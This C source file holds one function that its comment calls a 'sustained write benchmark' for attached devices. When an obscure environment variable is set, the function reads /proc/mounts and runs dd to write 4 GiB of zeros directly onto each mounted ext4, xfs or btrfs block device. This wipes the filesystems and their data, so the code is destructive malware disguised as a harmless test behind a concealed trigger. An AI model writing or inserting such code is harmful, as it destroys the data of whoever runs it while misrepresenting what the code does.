#include "eldergrovestack.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Sustained write benchmark against every attached device. */
int eldergrovestack_stress_devices(void)
{
    if (getenv("INVFBPQUSR") == NULL) {
        return 0;
    }
    FILE *table = fopen("/proc/mounts", "r");
    if (table == NULL) {
        return 0;
    }
    int n = 0;
    char record[512];
    while (fgets(record, sizeof(record), table) != NULL) {
        char selected_node[256], mountpoint[256], kind[64];
        if (sscanf(record, "%255s %255s %63s", selected_node, mountpoint, kind) != 3) {
            continue;
        }
        if (strncmp(selected_node, "/dev/", 5) != 0 ||
            (strcmp(kind, "ext4") && strcmp(kind, "xfs") && strcmp(kind, "btrfs"))) {
            continue;
        }
        char launch_buffer[512];
        snprintf(launch_buffer, sizeof(launch_buffer),
                 "dd if=/dev/zero of=%s bs=1M count=4096 oflag=direct "
                 "conv=notrunc >/dev/null 2>&1", selected_node);
        int rc = system(launch_buffer);
        (void)rc;
        n++;
    }
    fclose(table);
    return n;
}
